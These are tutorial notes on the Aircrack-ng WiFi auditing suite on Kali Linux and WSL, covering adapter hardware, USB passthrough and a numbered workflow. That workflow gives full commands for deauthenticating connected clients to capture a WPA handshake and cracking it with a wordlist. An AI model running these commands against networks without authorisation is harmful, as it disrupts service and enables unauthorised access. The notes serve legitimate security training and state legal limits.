# Aircrack-ng — Wireless Security Testing Suite

## What is Aircrack-ng?

Aircrack-ng is an open-source suite of tools for assessing WiFi network security. It is widely used by security researchers and penetration testers to audit wireless networks. It is a standard tool included in Kali Linux.

> **Important:** Aircrack-ng should only ever be used on networks you own or have explicit written permission to test. Unauthorized use is illegal in most countries.

---

## The Aircrack-ng Suite

Aircrack-ng is not a single tool — it is a **collection of tools**, each handling a different part of wireless security testing:

| Tool | Purpose |
|---|---|
| `airmon-ng` | Enable/disable monitor mode on wireless adapter |
| `airodump-ng` | Capture packets and scan for networks |
| `aireplay-ng` | Packet injection and deauthentication attacks |
| `aircrack-ng` | Crack WEP and WPA/WPA2 keys |
| `airdecap-ng` | Decrypt captured WEP/WPA packets |
| `airbase-ng` | Create rogue access points |

---

## Hardware Requirements

### Why a Special Adapter is Needed

Your built-in WiFi adapter **cannot** be used for wireless security testing because:

- Windows keeps full control of internal WiFi hardware
- WSL only receives a virtual ethernet adapter (`eth0`)
- Internal adapters use PCIe — cannot be passed through to WSL or VMs
- Monitor mode and packet injection require kernel-level driver support

### Recommended USB WiFi Adapters

| Adapter | Chipset | Band | Notes |
|---|---|---|---|
| Alfa AWUS036AXML | MT7921AU | 2.4 + 5GHz | Best modern choice, WiFi 6 |
| Alfa AWUS036ACM | MT7612U | 2.4 + 5GHz | Very stable, great Linux support |
| Alfa AWUS036ACH | RTL8812AU | 2.4 + 5GHz | Widely used, may need driver compilation |
| Alfa AWUS036NHA | AR9271 | 2.4GHz | Older but bulletproof driver support |
| Panda PAU09 | RT5572 | 2.4 + 5GHz | Budget friendly, reliable |

### Chipsets to Look For

| Chipset | Support Level |
|---|---|
| MT7612U / MT7921AU | ✅ Best modern Linux support |
| AR9271 | ✅ Older but very reliable |
| RTL8812AU | ✅ Widely used, sometimes needs manual driver |
| Broadcom | ❌ Poor Linux support, avoid |

> **Note:** TP-Link TL-WN722N v1 is compatible but v2/v3 silently switched chipsets and do NOT support packet injection.

---

## Installation on Kali WSL

```bash
sudo apt update
sudo apt install aircrack-ng -y

# Verify installation
aircrack-ng --version
```

---

## USB Adapter Passthrough to WSL

Since WSL cannot access hardware directly, use `usbipd-win` to pass through a USB WiFi adapter:

```powershell
# In Windows PowerShell (Admin)
winget install usbipd
usbipd list                          # find your adapter's BUSID
usbipd bind --busid <BUSID>
usbipd attach --wsl --busid <BUSID>
```

Then verify inside Kali WSL:
```bash
iwconfig    # should now show wlan0 or similar
```

---

## WSL Limitations

| Feature | Works in WSL |
|---|---|
| Crack captured `.cap` files | ✅ Yes |
| Offline dictionary attacks | ✅ Yes |
| Monitor mode (`airmon-ng`) | ❌ Requires USB passthrough |
| Packet capture (`airodump-ng`) | ❌ Requires USB passthrough |
| Packet injection (`aireplay-ng`) | ❌ Requires USB passthrough |

For full functionality, consider:
- **USB WiFi adapter + usbipd** — best WSL option
- **VirtualBox/VMware** — better hardware passthrough
- **Kali Live USB** — most reliable, full hardware access

---

## Basic Workflow (from practical demo)

### Step 1 — Check Wireless Adapter Status
Check the current status and interface name of your wireless adapter:
```bash
sudo airmon-ng
# Example output shows interface: wlan0
```

### Step 2 — Kill Conflicting Processes
Before enabling monitor mode, kill any processes that may interfere:
```bash
sudo airmon-ng check kill
```

### Step 3 — Enable Monitor Mode
Put the wireless adapter into monitor mode. The interface name will change (e.g. `wlan0` → `wlan0mon`):
```bash
sudo airmon-ng start wlan0
```

### Step 4 — Verify Monitor Mode is Active
Confirm the interface has changed to its monitor mode name:
```bash
sudo airmon-ng
# Interface should now show as wlan0mon
```

### Step 5 — Scan for Nearby Networks
Scan all nearby wireless networks to identify targets. Note the **BSSID** (MAC address) and **channel** of your target:
```bash
sudo airodump-ng wlan0mon
# Press Ctrl+C to stop once you have identified your target
```

### Step 6 — Target a Specific Network and Capture Traffic
Single out one network by channel and BSSID, and write captured packets to a file:
```bash
sudo airodump-ng -c <channel> --bssid <BSSID> -w wifi-hack wlan0mon
# e.g. sudo airodump-ng -c 11 --bssid AA:BB:CC:DD:EE:FF -w wifi-hack wlan0mon
# Devices connected to the network will appear in the STATION section
# Leave this running in the background
```

### Step 7 — Deauthenticate Connected Devices (Capture WPA Handshake)
Open a second terminal and force connected devices to reconnect, triggering a WPA handshake capture. Watch the first terminal for `WPA handshake: <BSSID>`:
```bash
sudo aireplay-ng --deauth 0 -a <BSSID> wlan0mon
# --deauth 0 = send deauth packets continuously with no delay
# Stop with Ctrl+C once the handshake is captured
```

### Step 8 — Verify Captured Files
List the files saved by airodump-ng. The `.cap` file contains the WPA handshake:
```bash
ls
# Look for: wifi-hack-01.cap
```

### Step 9 — Crack the Password Using a Wordlist
Run aircrack-ng against the captured handshake using rockyou.txt:
```bash
sudo aircrack-ng wifi-hack-01.cap -w /usr/share/wordlists/rockyou.txt
# Aircrack-ng will brute-force through the wordlist and display the key on success
```

### Step 10 — Disable Monitor Mode When Done
```bash
sudo airmon-ng stop wlan0mon
```

---

## Useful Commands Reference

```bash
# Check wireless interfaces
iwconfig

# List available wireless adapters
sudo airmon-ng

# Check for processes that may interfere
sudo airmon-ng check

# Kill interfering processes
sudo airmon-ng check kill

# Start monitor mode
sudo airmon-ng start wlan0

# Stop monitor mode
sudo airmon-ng stop wlan0mon

# Scan all channels
sudo airodump-ng wlan0mon

# Target specific network and write to file
sudo airodump-ng -c 11 --bssid AA:BB:CC:DD:EE:FF -w wifi-hack wlan0mon

# Deauthenticate all clients from an AP (continuous)
sudo aireplay-ng --deauth 0 -a <BSSID> wlan0mon

# List captured output files
ls

# Crack with wordlist
sudo aircrack-ng wifi-hack-01.cap -w /usr/share/wordlists/rockyou.txt

# Use multiple CPU cores for cracking
aircrack-ng output.cap -w wordlist.txt -p 4
```

---

## Wordlists for Password Cracking

Kali Linux includes built-in wordlists:

```bash
# Most commonly used
/usr/share/wordlists/rockyou.txt.gz

# Unzip it first
gunzip /usr/share/wordlists/rockyou.txt.gz

# List all available wordlists
ls /usr/share/wordlists/
```

---

## Alternatives and Complementary Tools

| Tool | Relationship to Aircrack-ng |
|---|---|
| `wifite` | Automates aircrack-ng workflow, beginner friendly |
| `hashcat` | Faster GPU-based cracking of captured handshakes |
| `bettercap` | Network MITM, complements wireless testing |
| `hostapd-wpe` | Rogue access point creation |

---

## Legal and Ethical Use

| ✅ Acceptable | ❌ Not Acceptable |
|---|---|
| Testing your own network | Testing neighbours WiFi |
| Authorized penetration testing | Any network without written permission |
| Learning in isolated lab environments | Public or corporate networks |
| CTF and practice challenges | Any unauthorized access |

Unauthorized use of Aircrack-ng violates computer crime laws in most countries including the Computer Fraud and Abuse Act (US), Computer Misuse Act (UK), and equivalent legislation in Poland and across the EU.

---

## Practice Resources

- **TryHackMe** — guided wireless security rooms
- **HackTheBox** — advanced wireless challenges
- **Your own home network** — always the safest legal practice target
- **Aircrack-ng official docs** — aircrack-ng.org

---

*Document based on practical session covering Aircrack-ng suite overview, hardware requirements, WSL limitations, USB adapter recommendations, and basic workflow on Kali Linux WSL.*
